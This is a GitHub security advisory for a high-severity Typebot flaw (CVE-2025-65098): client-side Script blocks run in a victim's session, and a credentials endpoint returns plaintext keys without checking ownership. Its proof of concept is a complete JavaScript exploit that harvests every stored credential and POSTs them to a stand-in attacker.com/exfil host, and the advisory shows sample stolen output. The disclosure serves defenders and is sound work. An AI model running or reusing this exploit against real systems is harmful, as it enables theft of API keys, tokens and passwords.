# [H] Typebot affected by Credential Theft via Client-Side Script Execution and API Authorization Bypass

## Summary
Severity: High
Advisory: GHSA-4xc5-wfwc-jw47
CVE: CVE-2025-65098
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-22
Source: https://github.com/advisories/GHSA-4xc5-wfwc-jw47
Type: github-advisory

## Affected
- npm: `@typebot.io/js` — affected >=0 <0.9.15

## Details
### Summary

Client-side script execution in Typebot allows stealing all stored credentials from any user. When a victim previews a malicious typebot by clicking "Run", JavaScript executes in their browser and exfiltrates their OpenAI keys, Google Sheets tokens, and SMTP passwords. The `/api/trpc/credentials.getCredentials` endpoint returns plaintext API keys without verifying credential ownership

---

### Details

The Script block with "Execute on client" enabled runs arbitrary JavaScript in the victim's browser with their authenticated session. This allows API calls on their behalf.

The `/api/trpc/credentials.getCredentials` endpoint returns plaintext credentials:

```http
GET /api/trpc/credentials.getCredentials?input={"json":{"scope":"user","credentialsId":"cm6sofgv200085ms9d2qyvgwc"}}

Response:
{
  "result": {
    "data": {
      "json": {
        "name": "My OpenAI Key",
        "data": { "apiKey": "sk-proj-abc123...xyz789" }
      }
    }
  }
}
```

The endpoint only checks if you're authenticated, not if you own the credential. Anyone can steal credentials by calling this with different IDs.

Vulnerable file: `packages/embeds/js/src/features/blocks/logic/script/executeScript.ts`

---

### PoC

Here's how to reproduce:

1. Create a new typebot in the Builder
2. Add a Script block and enable "Execute on client"
3. Paste this code:

```javascript
const exfil = async () => {
  const data = { credentials: [] };

  const list = await fetch(
    "https://app.typebot.io/api/trpc/credentials.listCredentials?input=" +
      encodeURIComponent(JSON.stringify({ json: { scope: "user" } })),
    { credentials: "include" }
  );
  const creds = (await list.json()).result?.data?.json?.credentials || [];

  for (const c of creds) {
    const full = await fetch(
      "https://app.typebot.io/api/trpc/credentials.getCredentials?input=" +
        encodeURIComponent(
          JSON.stringify({ json: { scope: "user", credentialsId: c.id } })
        ),
      { credentials: "include" }
    );
    const d = await full.json();
    data.credentials.push({
      name: d.result.data.json.name,
      type: c.type,
      apiKey: d.result.data.json.data.apiKey,
      fullData: d.result.data.json.data,
    });
  }

  const ws = await fetch(
    "https://app.typebot.io/api/trpc/workspace.listWorkspaces",
    { credentials: "include" }
  );
  const workspaces = (await ws.json()).result.data.json.workspaces;

  for (const w of workspaces) {
    const wsList = await fetch(
      "https://app.typebot.io/api/trpc/credentials.listCredentials?input=" +
        encodeURIComponent(
          JSON.stringify({ json: { workspaceId: w.id, scope: "workspace" } })
        ),
      { credentials: "include" }
    );
    const wsCreds = (await wsList.json()).result?.data?.json?.credentials || [];

    for (const c of wsCreds) {
      const full = await fetch(
        "https://app.typebot.io/api/trpc/credentials.getCredentials?input=" +
          encodeURIComponent(
            JSON.stringify({
              json: {
                workspaceId: w.id,
                scope: "workspace",
                credentialsId: c.id,
              },
            })
          ),
        { credentials: "include" }
      );
      const d = await full.json();
      data.credentials.push({
        workspace: w.name,
        name: d.result.data.json.name,
        type: c.type,
        fullData: d.result.data.json.data,
      });
    }
  }

  await fetch("https://attacker.com/exfil", {
    method: "POST",
    body: JSON.stringify(data),
  });
};
await exfil();
```

4. Share typebot with victim
5. When victim clicks "Run" to preview, script executes
6. All credentials exfiltrated in plaintext:

```json
{
  "credentials": [
    {
      "name": "My OpenAI",
      "type": "openai",
      "apiKey": "sk-proj-abc123...",
      "fullData": { "apiKey": "sk-proj-abc123..." }
    },
    {
      "workspace": "Company Workspace",
      "name": "Google Sheets",
      "type": "google-sheets",
      "fullData": {
        "refresh_token": "1//0gHdP...",
        "access_token": "ya29.a0..."
      }
    }
  ]
}
```

---

### Impact

All Typebot users storing credentials are affected. Attackers can steal OpenAI API keys, Google Sheets tokens, SMTP passwords, and all other stored credentials.

Example: Attacker creates a "Customer Feedback Template" and shares with 5 company employees. When they preview it, the attacker obtains the company's OpenAI key ($500+/month), Google Sheets access with customer data, and SMTP credentials.

Root causes:

- Client-side scripts execute with victim's authenticated session
- API returns plaintext credentials without ownership verification
- No user warnings or consent prompts
- Exploitable with free tier account

CWE-639 (Authorization Bypass), CWE-79 (XSS), CWE-311 (Missing Encryption)

## References
- https://github.com/baptisteArno/typebot.io/security/advisories/GHSA-4xc5-wfwc-jw47
- https://nvd.nist.gov/vuln/detail/CVE-2025-65098
- https://github.com/baptisteArno/typebot.io/commit/a68f0c91790af8f52f17557f4aa202e966e7e579
- https://github.com/baptisteArno/typebot.io
